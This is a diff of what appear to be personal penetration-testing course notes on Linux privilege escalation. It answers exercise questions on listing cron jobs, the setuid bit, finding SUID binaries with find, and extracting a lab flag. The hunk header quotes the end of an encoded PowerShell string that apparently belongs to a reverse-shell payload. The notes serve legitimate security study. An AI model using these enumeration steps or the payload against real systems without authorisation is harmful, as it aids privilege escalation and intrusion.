@@ -3640,12 +3640,12 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
     ```
   - Q2  crontab parameter is needed to list every cron job
     ```
-    crontab -l //current user 
-    `sudo crontab -l //root 
+    crontab -l $current user 
+    sudo crontab -l #root 
     ```
   - Q3 inherited UID called that allows a given binary to be executed with root permissions even when launched by a lower-privileged user: setuid
   - Q4 inside one of the SUID binaries available on the system
-    `find / -perm -u=s -type f 2>/dev/null`
+    `find / -perm -u=s -type f 2>/dev/null`  
     `strings /usr/bin/passwd_flag | grep "OS{"`  
 - 18.1.3 Automated Enumeration
   ```
